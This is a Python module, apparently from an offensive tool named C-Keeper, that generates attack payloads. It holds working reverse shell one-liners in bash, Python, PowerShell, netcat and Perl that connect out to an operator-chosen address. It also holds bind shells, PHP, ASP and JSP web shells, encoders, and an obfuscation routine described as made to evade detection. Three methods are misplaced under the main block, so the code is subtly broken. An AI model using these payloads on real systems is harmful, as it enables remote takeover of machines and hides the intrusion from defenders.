"""

Payload Generator Module for C-Keeper

Handles payload creation, encoding, and obfuscation

"""



import os

import base64

import random

import string

import binascii

from datetime import datetime

from typing import Dict, Any, List, Optional



from core.logger import CKeeperLogger





class PayloadGeneratorModule:

    """Payload generation and encoding module"""

    

    def __init__(self, config, database):

        """

        Initialize payload generator module

            Args:
            config: Configuration manager instance
            database: Database manager instance
        """
        self.config = config
        self.database = database
        self.logger = CKeeperLogger(__name__)
        self.session_id = None

            # Payload templates directory
        self.templates_dir = getattr(config, 'payloads_path', 'data/payloads')

            # Ensure templates directory exists
        os.makedirs(self.templates_dir, exist_ok=True)
        
        self.logger.logger.info("Payload Generator module initialized")

    

    def set_session(self, session_id: str):

        """Set current session ID"""

        self.session_id = session_id

        self.logger.logger.debug(f"Session set to: {session_id}")

    

    def generate_reverse_shell(self, target_ip: str, target_port: int, shell_type: str = "bash") -> Dict[str, Any]:

        """

        Generate reverse shell payload

        

        Args:

            target_ip: IP address to connect back to

            target_port: Port to connect back to

            shell_type: Type of shell (bash, python, powershell, etc.)

            

        Returns:

            Dict containing payload information

        """

        try:

            payload_templates = {

                "bash": f"bash -i >& /dev/tcp/{target_ip}/{target_port} 0>&1",

                "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target_ip}\",{target_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",

                "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{target_ip}',{target_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",

                "nc": f"nc -e /bin/sh {target_ip} {target_port}",

                "perl": f"perl -e 'use Socket;$i=\"{target_ip}\";$p={target_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"

            }

            

            if shell_type not in payload_templates:

                raise ValueError(f"Unsupported shell type: {shell_type}")

            

            payload = payload_templates[shell_type]

            

            result = {

                "type": "reverse_shell",

                "shell_type": shell_type,

                "target_ip": target_ip,

                "target_port": target_port,

                "payload": payload,

                "size": len(payload),

                "created": datetime.now().isoformat()

            }

            

            # Log the payload generation

            self._log_payload_generation(result)

            

            self.logger.logger.info(f"Generated {shell_type} reverse shell payload")

            return result

            

        except Exception as e:

            self.logger.logger.error(f"Error generating reverse shell: {e}")

            raise

    

    def generate_bind_shell(self, listen_port: int, shell_type: str = "bash") -> Dict[str, Any]:

        """Generate bind shell payload"""

        try:

            payload_templates = {

                "bash": f"bash -c 'bash -i >& /dev/tcp/0.0.0.0/{listen_port} 0>&1'",

                "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{listen_port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",

                "nc": f"nc -lvp {listen_port} -e /bin/sh"

            }

            

            if shell_type not in payload_templates:

                raise ValueError(f"Unsupported shell type: {shell_type}")

            

            payload = payload_templates[shell_type]

            

            result = {

                "type": "bind_shell",

                "shell_type": shell_type,

                "listen_port": listen_port,

                "payload": payload,

                "size": len(payload),

                "created": datetime.now().isoformat()

            }

            

            self._log_payload_generation(result)

            self.logger.logger.info(f"Generated {shell_type} bind shell payload")

            return result

            

        except Exception as e:

            self.logger.logger.error(f"Error generating bind shell: {e}")

            raise

    

    def generate_web_shell(self, shell_type: str = "php") -> Dict[str, Any]:

        """Generate web shell payload"""

        try:

            payload_templates = {

                "php": "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>",

                "asp": "<%eval request(\"cmd\")%>",

                "jsp": "<%@ page import=\"java.util.*,java.io.*\"%><%if (request.getParameter(\"cmd\") != null) {out.println(\"<pre>\");Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}out.println(\"</pre>\");}%>"

            }

            

            if shell_type not in payload_templates:

                raise ValueError(f"Unsupported web shell type: {shell_type}")

            

            payload = payload_templates[shell_type]

            

            result = {

                "type": "web_shell",

                "shell_type": shell_type,

                "payload": payload,

                "size": len(payload),

                "created": datetime.now().isoformat()

            }

            

            self._log_payload_generation(result)

            self.logger.logger.info(f"Generated {shell_type} web shell payload")

            return result

            

        except Exception as e:

            self.logger.logger.error(f"Error generating web shell: {e}")

            raise

    

    def encode_payload(self, payload: str, encoding_type: str) -> Dict[str, Any]:

        """Encode payload using various methods"""

        try:

            encoded_payload = payload

            

            if encoding_type == "base64":

                encoded_payload = base64.b64encode(payload.encode()).decode()

            elif encoding_type == "hex":

                encoded_payload = binascii.hexlify(payload.encode()).decode()

            elif encoding_type == "url":

                import urllib.parse

                encoded_payload = urllib.parse.quote(payload)

            elif encoding_type == "double_base64":

                temp = base64.b64encode(payload.encode()).decode()

                encoded_payload = base64.b64encode(temp.encode()).decode()

            else:

                raise ValueError(f"Unsupported encoding type: {encoding_type}")

            

            result = {

                "original_payload": payload,

                "encoded_payload": encoded_payload,

                "encoding_type": encoding_type,

                "original_size": len(payload),

                "encoded_size": len(encoded_payload),

                "created": datetime.now().isoformat()

            }

            

            self.logger.logger.info(f"Encoded payload using {encoding_type}")

            return result

            

        except Exception as e:

            self.logger.logger.error(f"Error encoding payload: {e}")

            raise

    

    def get_statistics(self) -> Dict[str, Any]:

        """Get module statistics"""

        try:

            query = """

            SELECT 

                COUNT(*) as total_payloads,

                COUNT(DISTINCT payload_type) as unique_types

            FROM payload_history

            WHERE session_id = ? OR session_id IS NULL

            """

            

            result = self.database.execute_query(query, [self.session_id])

            stats = result[0] if result else {"total_payloads": 0, "unique_types": 0}

            

            return stats

            

        except Exception as e:

            self.logger.logger.error(f"Error getting statistics: {e}")

            return {"total_payloads": 0, "unique_types": 0}

    

    def _log_payload_generation(self, payload_info: Dict[str, Any]):

        """Log payload generation to database"""

        try:

            query = """

            INSERT INTO payload_history 

            (session_id, payload_type, payload_data, created)

            VALUES (?, ?, ?, ?)

            """

            

            import json

            params = [

                self.session_id,

                payload_info.get('type', 'unknown'),

                json.dumps(payload_info),

                datetime.now().isoformat()

            ]

            

            self.database.execute_query(query, params)

            

        except Exception as e:

            self.logger.logger.warning(f"Failed to log payload generation: {e}")





if __name__ == "__main__":

    print("PayloadGeneratorModule loaded successfully")

        

    def obfuscate_payload(self, payload: str, obfuscation_type: str) -> Dict[str, Any]:

        """Obfuscate payload to evade detection"""

        try:

            obfuscated_payload = payload

            

            if obfuscation_type == "string_replace":

                # Replace common strings with variables

                replacements = {

                    'bash': '$SHELL',

                    'sh': '$0',

                    '/bin/': '$(dirname $0)/../bin/',

                    'python': 'python3'

                }

                for old, new in replacements.items():

                    obfuscated_payload = obfuscated_payload.replace(old, new)

                    

            elif obfuscation_type == "variable_insertion":

                # Insert random variables

                var_name = ''.join(random.choices(string.ascii_lowercase, k=5))

                obfuscated_payload = f"{var_name}=1; {payload}"

                

            elif obfuscation_type == "comment_insertion":

                # Insert random comments

                comment = ''.join(random.choices(string.ascii_letters, k=10))

                obfuscated_payload = payload.replace(';', f'; # {comment};')

                

            result = {

                "original_payload": payload,

                "obfuscated_payload": obfuscated_payload,

                "obfuscation_type": obfuscation_type,

                "created": datetime.now().isoformat()

            }

            

            self.logger.logger.info(f"Obfuscated payload using {obfuscation_type}")

            return result

            

        except Exception as e:

            self.logger.logger.error(f"Error obfuscating payload: {e}")

            raise



    def save_payload_to_file(self, payload_data: Dict[str, Any], filename: str) -> str:

        """Save payload to file"""

        try:

            filepath = os.path.join(self.templates_dir, filename)

            

            with open(filepath, 'w') as f:

                f.write(payload_data.get('payload', ''))

            

            self.logger.logger.info(f"Payload saved to: {filepath}")

            return filepath

            

        except Exception as e:

            self.logger.logger.error(f"Error saving payload to file: {e}")

            raise



    def list_saved_payloads(self) -> List[str]:

        """List all saved payload files"""

        try:

            if not os.path.exists(self.templates_dir):

                return []

                

            files = [f for f in os.listdir(self.templates_dir) 

                    if os.path.isfile(os.path.join(self.templates_dir, f))]

            

            return files

            

        except Exception as e:

            self.logger.logger.error(f"Error listing saved payloads: {e}")

            return []